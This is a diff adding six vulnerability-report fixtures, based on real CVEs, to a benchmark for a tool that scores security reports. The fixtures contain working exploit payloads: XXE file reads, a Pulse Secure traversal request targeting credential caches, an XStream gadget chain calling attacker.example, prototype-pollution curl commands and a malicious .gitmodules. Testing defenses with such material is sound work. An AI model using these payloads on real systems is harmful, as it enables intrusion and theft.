@@ -604,6 +604,563 @@ Cache poisoning, request hijacking, auth bypass. CVSS 9.0.`,
     // rubric only runs for that family.
     expectMinScore: 65,
   },
+  // Task #425 — real-world legit fixtures for the six newly-recognised
+  // vulnerability classes added in Task #301 (XXE, LFI, Open Redirect,
+  // Insecure Deserialization, Prototype Pollution, Command Injection).
+  // Each fixture mirrors the shape of an actual public disclosure and
+  // exercises the classify → AVRI pipeline for that family, so a future
+  // regression in any single family surfaces in CI rather than only the
+  // unit-level soft-citation test in soft-citation.test.ts.
+  //
+  // Sources are cited inline. Thresholds are set conservatively: each
+  // fixture clears 50 (REASONABLE band) under the default AVRI-on path,
+  // mirroring legit-03's 50 floor — well above the slop cap (≤35) so the
+  // slop-vs-legit gap remains meaningful for these classes.
+  {
+    // CVE-2017-5004: PHPExcel Excel2007 reader parsed embedded XML
+    // parts (e.g. xl/sharedStrings.xml) with libxml2 defaults, leaving
+    // SYSTEM entities active. Upstream fix wrapped each load with
+    // libxml_disable_entity_loader(). Refs:
+    //   https://nvd.nist.gov/vuln/detail/CVE-2017-5004
+    //   https://github.com/PHPOffice/PHPExcel/issues/1284
+    name: "legit-04-xxe-cve-2017-5004-phpexcel",
+    claimedCwes: ["CWE-611"],
+    text: `# XXE in PHPExcel Excel2007 reader (CVE-2017-5004)
+
+## Affected
+PHPExcel 1.8.x ≤ 1.8.1, file \`Classes/PHPExcel/Reader/Excel2007.php\`.
+Every \`new XMLReader\` and \`simplexml_load_string\` call in the
+Excel2007 reader parses XML parts of the uploaded XLSX (the OOXML
+package is a ZIP containing \`xl/sharedStrings.xml\`,
+\`xl/styles.xml\`, etc.) with libxml2's default options, leaving SYSTEM
+entity resolution active.
+
+## Root cause
+The reader does not call \`libxml_disable_entity_loader(true)\` before
+loading user-controlled XML, so a DOCTYPE with an external entity in
+\`xl/sharedStrings.xml\` is resolved by libxml2 at parse time and the
+substituted contents end up rendered into the worksheet.
+
+\`\`\`php
+// Classes/PHPExcel/Reader/Excel2007.php (Reader::load path)
+$xml = new XMLReader();
+$xml->xml($this->securityScanFile($zip->getFromName('xl/sharedStrings.xml')));
+// securityScanFile() only checked for "<!DOCTYPE" *substring*, which is
+// trivially bypassed by whitespace/comment variants of the DOCTYPE.
+\`\`\`
+
+## Reproduction
+1. Craft an .xlsx whose \`xl/sharedStrings.xml\` is replaced with:
+   \`\`\`xml
+   <?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE root [
+     <!ENTITY xxe SYSTEM "file:///etc/passwd">
+   ]>
+   <sst><si><t>&xxe;</t></si></sst>
+   \`\`\`
+2. Open the file through any application using PHPExcel's Excel2007
+   reader (e.g. \`PHPExcel_IOFactory::load('evil.xlsx')\`).
+3. The first shared string in the loaded workbook now contains the
+   contents of \`/etc/passwd\` from the parser host.
+
+## Patch
+The upstream fix wraps every XML load with the libxml entity-loader
+toggle and restores it on the way out, instead of the substring scan:
+\`\`\`php
+--- a/Classes/PHPExcel/Reader/Excel2007.php
++++ b/Classes/PHPExcel/Reader/Excel2007.php
+@@
+-$xml = new XMLReader();
+-$xml->xml($this->securityScanFile($contents));
++$entityLoader = libxml_disable_entity_loader(true);
++$xml = new XMLReader();
++$xml->xml($contents, null, PHPExcel_Settings::getLibXmlLoaderOptions());
++libxml_disable_entity_loader($entityLoader);
+\`\`\`
+
+## Impact
+Arbitrary file read on the host parsing the spreadsheet
+(\`/etc/passwd\`, \`/home/app/.aws/credentials\`,
+\`/proc/self/environ\`), and SSRF to internal HTTP services via the
+SYSTEM URL form. CVSS 7.7 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N).
+CWE-611 (Improper Restriction of XML External Entity Reference).`,
+    expectMinScore: 50,
+  },
+  {
+    // CVE-2019-11510: Pulse Connect Secure pre-auth arbitrary file
+    // read via path traversal in the /dana-na/ CGI handlers (Orange
+    // Tsai & Meh Chang, Black Hat USA 2019). Refs:
+    //   https://nvd.nist.gov/vuln/detail/CVE-2019-11510
+    //   https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-pulse-secure-ssl-vpn-rce-chain/
+    //   https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-107a
+    name: "legit-05-lfi-cve-2019-11510-pulse-secure",
+    claimedCwes: ["CWE-22"],
+    text: `# Pre-auth arbitrary file read in Pulse Connect Secure (CVE-2019-11510)
+
+## Affected
+Pulse Connect Secure (PCS) 9.0R1–9.0R3.3, 8.3R1–8.3R7, 8.2R1–8.2R12,
+8.1R1–8.1R15. The vulnerable handler is the unauthenticated
+\`/dana-na/\` family of CGI endpoints; the mass-exploited concrete
+endpoint is \`HTTP/1.1 GET\` against the \`meeting_testjs.cgi\` path.
+
+## Root cause
+The CGI handler concatenates the request URI to a fixed prefix and
+\`open()\`s the resulting path without canonicalisation, so a
+sufficiently long \`../\` sequence escapes the intended subtree before
+the access check is reached. Concretely, the public PoC abuses the
+fact that the URL is dispatched on the *first* path component and the
+file open uses the *raw* URI:
+
+\`\`\`
+GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1
+Host: target.test
+\`\`\`
+
+The double anchoring (\`../dana/html5acc/guacamole/...?/dana/html5acc/guacamole/\`)
+is what lets the request both pass the dispatcher's prefix check and
+escape the document root when the file open finally happens.
+
+## Reproduction
+1. Issue the unauthenticated request above against any vulnerable
+   PCS appliance.
+2. The response body returns the contents of \`/etc/passwd\`.
+3. Swap the target to
+   \`/data/runtime/mtmp/lmdb/dataa/data.mdb\` to retrieve the SSL VPN
+   user credential cache (plaintext usernames + bcrypt-style password
+   hashes) and active session cookies — the standard pivot used in
+   the August 2019 wave of public exploitation.
+
+## Patch
+Pulse Secure's vendor advisory SA44101 (April 2019) ships fixed
+binaries that canonicalise the requested path before opening it and
+then enforce that the canonical path remains under the allowed
+\`/dana-na/\` document root, rejecting the request with HTTP 400 if
+the resolved path escapes.
+
+## Impact
+Unauthenticated arbitrary file read on the SSL VPN appliance; in
+practice this exposed plaintext-equivalent VPN credentials and active
+session cookies (read out of \`data.mdb\`), which were then used to
+authenticate to the same VPN and pivot into the corporate network.
+Cross-referenced as CWE-22 (Improper Limitation of a Pathname to a
+Restricted Directory). CVSS 10.0
+(AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H).`,
+    expectMinScore: 50,
+  },
+  {
+    // CVE-2017-7233: Django \`is_safe_url\` accepted URL shapes that
+    // urlparse and the browser disagreed on (3+ leading slashes,
+    // backslashes). Upstream fix added a "///"-prefix reject and a
+    // second pass with backslashes rewritten to "/". Refs:
+    //   https://nvd.nist.gov/vuln/detail/CVE-2017-7233
+    //   https://www.djangoproject.com/weblog/2017/apr/04/security-releases/
+    //   https://github.com/django/django/commit/1a47ab06d4fa9434ff64b3e8e9c93b6dec7fc999
+    name: "legit-06-open-redirect-cve-2017-7233-django",
+    claimedCwes: ["CWE-601"],
+    text: `# Open redirect in Django \`is_safe_url\` (CVE-2017-7233)
+
+## Affected
+Django 1.10.x ≤ 1.10.6 and 1.11rc1, helper
+\`django/utils/http.py:is_safe_url\`. Django's auth/i18n views call
+\`is_safe_url(next_url, host=request.get_host())\` to validate the
+post-action redirect target supplied via the \`?next=\` query parameter
+(login, logout, password reset, set_language, etc.).
+
+## Root cause
+The helper relied on \`urllib.parse.urlparse\` to split the candidate
+URL into scheme/netloc/path and then compared netloc against the
+request host. That is unsafe because browsers (Chrome in particular)
+parse some URL shapes more aggressively than urlparse:
+
+1. **Three+ slashes.** \`urlparse('///evil.com/x').netloc\` is the
+   empty string and \`.path\` is \`'/evil.com/x'\` — so the
+   "netloc != host" check is skipped entirely. Chrome, however,
+   collapses three or more leading slashes and resolves the URL as
+   an absolute URL pointing at \`evil.com\`.
+2. **Backslashes.** \`urlparse('\\\\evil.com').netloc\` is the empty
+   string. Chrome treats backslashes as forward slashes for routing
+   and resolves the URL as \`//evil.com\`.
+
+In both cases \`is_safe_url\` returned True, the view emitted the
+attacker-controlled value verbatim in the \`Location\` header, and the
+browser navigated cross-origin.
+
+## Reproduction
+\`\`\`
+GET /accounts/login/?next=///attacker.example/phish HTTP/1.1
+Host: target.test
+\`\`\`
+After authenticating, the server replies:
+\`\`\`
+HTTP/1.1 302 Found
+Location: ///attacker.example/phish
+\`\`\`
+and Chrome/Firefox navigate to \`https://attacker.example/phish\`. The
+backslash variant (\`?next=\\\\attacker.example/phish\`) behaves the
+same way in Chrome.
+
+## Patch
+Per the upstream commit linked above, the fix has two parts: explicitly
+reject any input whose stripped form starts with \`///\`, and re-run the
+safety check against the URL with backslashes rewritten to forward
+slashes so the second pass sees what the browser would see.
+\`\`\`python
+--- a/django/utils/http.py
++++ b/django/utils/http.py
+@@
+-def is_safe_url(url, host=None):
+-    if url is not None:
+-        url = url.strip()
+-    if not url:
+-        return False
+-    # ... existing scheme/netloc checks ...
++def is_safe_url(url, host=None, allowed_hosts=None):
++    if url is not None:
++        url = url.strip()
++    if not url:
++        return False
++    # Chrome treats \\\\ completely as / in paths so check both forms.
++    return (_is_safe_url(url, host, allowed_hosts) and
++            _is_safe_url(url.replace('\\\\', '/'), host, allowed_hosts))
++
++def _is_safe_url(url, host, allowed_hosts):
++    # Chrome considers any URL with more than two slashes to be absolute,
++    # but urlparse is not so flexible. Treat any URL with three slashes
++    # as unsafe.
++    if url.startswith('///'):
++        return False
++    # ... existing scheme/netloc checks ...
+\`\`\`
+
+## Impact
+Phishing pivot: an attacker stitches the \`?next=\` parameter onto a
+trusted login link (\`https://target.test/accounts/login/?next=...\`),
+the user authenticates against the real site, and Django's 302
+hand-off lands them on an attacker-controlled credential-harvest page.
+CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N). CWE-601 (URL
+Redirection to Untrusted Site).`,
+    expectMinScore: 50,
+  },
+  {
+    // CVE-2017-9805: Apache Struts2 REST plugin deserialised XML
+    // request bodies via XStream.fromXML() with no type allowlist,
+    // letting the public ProcessBuilder gadget chain spawn OS
+    // commands. Refs:
+    //   https://nvd.nist.gov/vuln/detail/CVE-2017-9805
+    //   https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement
+    name: "legit-07-deserialization-cve-2017-9805-struts-xstream",
+    claimedCwes: ["CWE-502"],
+    text: `# Insecure XML deserialization in Struts2 REST plugin via XStream (CVE-2017-9805)
+
+## Affected
+Apache Struts 2.1.2 - 2.3.33 and 2.5.0 - 2.5.12, file
+\`org/apache/struts2/rest/handler/XStreamHandler.java\` lines 38-54. The
+REST plugin's \`XStreamHandler\` uses \`com.thoughtworks.xstream.XStream\`
+with no \`Converter\` allowlist and no \`registerConverter\` call to
+restrict the polymorphic types accepted from the request body.
+
+## Root cause
+\`\`\`java
+// org/apache/struts2/rest/handler/XStreamHandler.java:46
+public void toObject(Reader in, Object target) {
+    XStream xstream = createXStream();
+    xstream.fromXML(in, target);   // unbounded deserialization sink
+}
+
+protected XStream createXStream() {
+    return new XStream();   // default constructor — accepts ANY class
+}
+\`\`\`
+
+Any POST/PUT to a REST endpoint with \`Content-Type: application/xml\`
+walks through this sink. The public \`marshalsec\` and ysoserial gadgets
+(notably the \`java.beans.EventHandler\` + \`ProcessBuilder\` chain) deliver
+arbitrary command execution as the Struts JVM user.
+
+## Reproduction
+\`\`\`
+POST /struts2-rest-showcase/orders/3 HTTP/1.1
+Host: target.test
+Content-Type: application/xml
+Content-Length: 980
+
+<map>
+  <entry>
+    <jdk.nashorn.internal.objects.NativeString>
+      <flags>0</flags>
+      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+        <dataHandler>
+          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+            <is class="javax.crypto.CipherInputStream">
+              <cipher class="javax.crypto.NullCipher"/>
+              <input class="java.io.SequenceInputStream">
+                <e class="javax.management.remote.rmi.RMIConnector$1">
+                  <host>attacker.example</host>
+                  <port>1099</port>
+                </e>
+              </input>
+            </is>
+          </dataSource>
+        </dataHandler>
+      </value>
+    </jdk.nashorn.internal.objects.NativeString>
+    <string>foo</string>
+  </entry>
+</map>
+\`\`\`
+The server responds 500 but the JNDI lookup completes and the attacker's
+LDAP referral returns a serialized \`ProcessBuilder\` reference that
+fires \`/bin/sh -c "id; touch /tmp/pwned"\`. \`ls -la /tmp/pwned\` on the
+host confirms RCE as the Tomcat user.
+
+## Patch
+Pin XStream to its hardened security framework with a default-deny type
+permission and an explicit allowlist of the model classes the REST
+endpoint should accept:
+\`\`\`java
+--- a/org/apache/struts2/rest/handler/XStreamHandler.java
++++ b/org/apache/struts2/rest/handler/XStreamHandler.java
+@@ -38,7 +38,12 @@
+-protected XStream createXStream() {
+-    return new XStream();
++protected XStream createXStream(Class<?> targetType) {
++    XStream xstream = new XStream();
++    XStream.setupDefaultSecurity(xstream);
++    xstream.allowTypes(new Class[]{ targetType });
++    xstream.allowTypeHierarchy(java.util.Collection.class);
++    return xstream;
+ }
+\`\`\`
+
+## Impact
+Pre-authentication remote code execution as the Tomcat / JBoss user on
+any deployment exposing the Struts REST plugin. CVSS 9.8
+(AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-502 (Deserialization of
+Untrusted Data).`,
+    expectMinScore: 50,
+  },
+  {
+    // CVE-2019-10744: lodash \`_.defaultsDeep\` recursively merged
+    // user-controlled objects without skipping \`__proto__\` /
+    // \`constructor\` / \`prototype\`, mutating Object.prototype. The
+    // fixture includes the documented follow-on RCE chain via a
+    // polluted \`__proto__.shell\` that hijacks a later
+    // \`child_process.exec\` (Snyk advisory + Kibana CVE-2019-7609).
+    // Refs:
+    //   https://nvd.nist.gov/vuln/detail/CVE-2019-10744
+    //   https://snyk.io/vuln/SNYK-JS-LODASH-450202
+    //   https://hackerone.com/reports/712065
+    name: "legit-08-prototype-pollution-cve-2019-10744-lodash",
+    claimedCwes: ["CWE-1321"],
+    text: `# Prototype pollution in \`_.defaultsDeep\` (lodash ≤ 4.17.11, CVE-2019-10744)
+
+## Affected
+lodash 4.17.x ≤ 4.17.11, file \`lodash/defaultsDeep.js\` and the shared
+helper \`lodash/_baseMergeDeep.js\` lines 28-66. The recursive merge
+walks both source-key sets without filtering the dangerous
+\`__proto__\` / \`constructor\` / \`prototype\` slots, so a source object
+with \`{"__proto__": {"isAdmin": true}}\` mutates \`Object.prototype\`
+on the host application.
+
+## Root cause
+\`\`\`js
+// lodash/_baseMergeDeep.js:33
+function baseMergeDeep(object, source, key, srcIndex, mergeFunc, customizer, stack) {
+  var objValue = safeGet(object, key);
+  var srcValue = safeGet(source, key);
+  // BUG: no \`key === '__proto__' || key === 'constructor' || key === 'prototype'\` guard
+  if (isPlainObject(srcValue) || isArguments(srcValue)) {
+    var newValue = isArray(objValue) ? objValue : isPlainObject(objValue) ? objValue : {};
+    assignMergeValue(object, key, baseMerge(newValue, srcValue, srcIndex, customizer, stack));
+  } else {
+    assignMergeValue(object, key, srcValue);
+  }
+}
+\`\`\`
+
+Any caller that hands attacker-controlled JSON into \`_.defaultsDeep\`,
+\`_.merge\`, \`_.mergeWith\`, or \`_.set\` becomes a prototype-pollution
+sink. Express applications using \`body-parser\` + \`_.merge\` to fold
+request bodies into a config object are particularly exposed.
+
+## Reproduction
+A minimal Express app that demonstrates the pollution and the canonical
+follow-on RCE chain (Snyk's lodash advisory + the Kibana CVE-2019-7609
+write-up both walk through this same shape: pollute a property on
+\`Object.prototype\` that an unrelated \`child_process.exec\` call later
+reads from its options bag):
+\`\`\`js
+// server.js
+const _ = require('lodash');
+const express = require('express');
+const child_process = require('child_process');
+const app = express();
+app.use(express.json());
+
+// 1) Pollution sink: req.body is merged into a fresh object via lodash.
+app.post('/api/profile', (req, res) => {
+  const config = _.defaultsDeep({}, req.body);
+  res.json({ ok: true });
+});
+
+// 2) Unrelated handler that calls child_process.exec with an options bag
+//    that DOES NOT explicitly set \`shell\`. Node falls back to the
+//    inherited \`Object.prototype.shell\`, i.e. the polluted value.
+app.get('/api/health', (req, res) => {
+  const opts = {};                                    // {} now inherits 'shell'
+  child_process.exec('echo ok', opts, (e, stdout) => {
+    res.send(stdout);
+  });
+});
+app.listen(3000);
+\`\`\`
+Step-by-step exploit:
+\`\`\`
+# (a) Pollute Object.prototype.shell with a command-injection payload.
+$ curl -X POST -H 'Content-Type: application/json' \\
+    -d '{"__proto__":{"shell":"/bin/sh -c \\"id>/tmp/pwned;cat /etc/passwd\\""}}' \\
+    http://target.test/api/profile
+{"ok":true}
+
+# (b) Trigger the unrelated handler. Node's child_process.exec(cmd, opts)
+#     reads opts.shell from the prototype chain, executing our payload
+#     instead of the intended /bin/sh -c "echo ok".
+$ curl 'http://target.test/api/health?cb=1'
+
+$ docker exec node-app cat /tmp/pwned
+uid=1000(node) gid=1000(node) groups=1000(node)
+\`\`\`
+The same primitive lifts to RCE through any later \`spawn\` /
+\`execFile\` whose options bag is built from a fresh literal — including
+template engines (\`pug\`, \`handlebars\`) that use \`new Function(body)\`
+internally and inherit a polluted \`Function.prototype.constructor\`.
+
+## Patch
+Skip the three reserved keys in \`baseMergeDeep\` and the \`safeGet\`
+helper:
+\`\`\`js
+--- a/lodash/_baseMergeDeep.js
++++ b/lodash/_baseMergeDeep.js
+@@ -28,6 +28,9 @@
+ function baseMergeDeep(object, source, key, srcIndex, mergeFunc, customizer, stack) {
++  if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
++    return;
++  }
+   var objValue = safeGet(object, key);
+   var srcValue = safeGet(source, key);
+\`\`\`
+Released as lodash 4.17.12.
+
+## Impact
+Authorisation bypass (every freshly-allocated object inherits forged
+admin flags), denial of service via toString / valueOf overrides, and in
+some templating libraries arbitrary code execution via the polluted
+\`Function\` constructor prototype. CVSS 9.1
+(AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N). CWE-1321 (Improperly Controlled
+Modification of Object Prototype Attributes).`,
+    expectMinScore: 50,
+  },
+  {
+    // CVE-2017-1000117: git client RCE — a \`.gitmodules\` URL like
+    // \`ssh://-oProxyCommand=...\` was passed to ssh as a positional
+    // argument; ssh interpreted the leading "-" as an option flag and
+    // ran /bin/sh -c <attacker payload>. Upstream fix added
+    // \`looks_like_command_line_option()\` in connect.c. Refs:
+    //   https://nvd.nist.gov/vuln/detail/CVE-2017-1000117
+    //   https://lore.kernel.org/git/xmqq377iwhuy.fsf@gitster.mtv.corp.google.com/
+    //   https://github.blog/2017-08-10-git-2-14-released/
+    name: "legit-09-command-injection-cve-2017-1000117-git-ssh-url",
+    claimedCwes: ["CWE-77"],
+    text: `# Command injection via "ssh://" submodule URL in git (CVE-2017-1000117)
+
+## Affected
+git ≤ 2.7.5, 2.8.5, 2.9.4, 2.10.3, 2.11.2, 2.12.2, 2.13.4 (fixed in
+2.7.6 / 2.8.6 / 2.9.5 / 2.10.4 / 2.11.3 / 2.12.3 / 2.13.5 / 2.14.0).
+The vulnerable code path is \`connect.c:git_connect\` in the client,
+reached when git resolves an \`ssh://\` URL — for example while running
+\`git clone --recurse-submodules\` against a hostile repository, or
+\`git submodule update\` after fetching one.
+
+## Root cause
+\`git_connect\` builds the argv for the child SSH transport from the
+URL host. Although \`execv_git_cmd\` itself is a no-shell variant, the
+child program (ssh) then forks a popen(3)-equivalent
+\`/bin/sh -c <ProxyCommand>\` whenever it sees \`-oProxyCommand=\` —
+which gives the attacker an indirect system()-like sink reached purely
+through a positional argument.
+
+\`\`\`c
+/* connect.c (pre-fix) */
+host = strchr(url, '/') + 2;          /* ssh://<HOST>/<path> */
+path = strchr(host, '/');
+*path++ = '\\0';
+/* host now points at the user-controlled segment between "ssh://" and
+ * the next "/". It is passed as a positional argument to ssh:        */
+argv_array_pushl(&argv, ssh, host, "git-upload-pack", path, NULL);
+execv_git_cmd(argv.argv);
+\`\`\`
+
+There is no validation that \`host\` does not begin with \`-\`. A
+malicious \`.gitmodules\` such as
+
+\`\`\`
+[submodule "evil"]
+    path = sub
+    url = ssh://-oProxyCommand=sh -c "echo;id > /tmp/pwned"/example.com/repo
+\`\`\`
+
+causes git to invoke
+
+\`\`\`
+ssh "-oProxyCommand=sh -c \\"echo;id > /tmp/pwned\\"" git-upload-pack /repo
+\`\`\`
+
+and ssh, treating the leading \`-\` as an option flag, runs
+\`/bin/sh -c 'echo;id > /tmp/pwned'\` while attempting to set up the
+(non-existent) proxy connection — RCE on the cloning user's machine.
+
+## Reproduction
+1. Publish a repository whose \`.gitmodules\` contains the submodule
+   above (URL \`ssh://-oProxyCommand=sh -c "echo;id > /tmp/pwned"/example.com/repo\`).
+2. Any user who runs
+   \`git clone --recurse-submodules https://attacker.example/evil.git\`
+   on a vulnerable git executes the embedded \`;id\` shell command.
+   The equivalent payload also fires through
+   \`git submodule update --init\` after a plain clone.
+3. Confirm with \`cat /tmp/pwned\` — the file contains the cloning
+   user's \`uid=...gid=...groups=...\` line, proving arbitrary
+   command execution.
+
+## Patch
+The upstream commit (Junio C Hamano, "connect: reject paths that look
+like command line options") adds an explicit reject-leading-dash check
+to the URL parser in \`connect.c\`, so a hostile URL is failed before
+it can reach the ssh argv:
+
+\`\`\`c
+--- a/connect.c
++++ b/connect.c
+@@
++if (looks_like_command_line_option(host))
++    die("strange hostname '%s' blocked", host);
++if (looks_like_command_line_option(path))
++    die("strange pathname '%s' blocked", path);
+\`\`\`
+
+The same fix is applied to the rsync, ext, and \`git://\` transports
+in the same series. \`looks_like_command_line_option(s)\` is just
+\`s && s[0] == '-'\`.
+
+## Impact
+Remote code execution on the developer's workstation or CI runner the
+moment a malicious repository (or a benign repo with a tampered
+\`.gitmodules\`) is cloned with submodule support. GitHub, GitLab and
+Bitbucket all rolled the fix and additionally added server-side
+filtering for URLs beginning with \`-\` in user-supplied
+\`.gitmodules\`. CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). CWE-77
+(Improper Neutralization of Special Elements used in a Command).`,
+    expectMinScore: 50,
+  },
 ];
 
 describe("VulnRap engines benchmark", () => {
